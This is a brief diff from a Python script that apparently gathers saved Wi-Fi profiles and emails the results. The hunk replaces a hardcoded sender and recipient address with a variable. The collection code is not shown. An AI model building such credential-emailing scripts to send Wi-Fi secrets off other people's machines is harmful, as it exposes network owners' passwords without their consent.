@@ -29,8 +29,8 @@ if len(profile_names) != 0:
 
 
 msg = EmailMessage()
-msg['From'] = 'mkpro118@gmail.com'
-msg['To'] = ['mkpro118@gmail.com', ]  # add your email after the comma if you want to. Please wrap it with single( '' ) or double quotes ( "" )
+msg['From'] = EMAIL_ADDRESS
+msg['To'] = [EMAIL_ADDRESS, ]  # add your email after the comma if you want to. Please wrap it with single( '' ) or double quotes ( "" )
 
 content = ''
 for i in wifi_list:
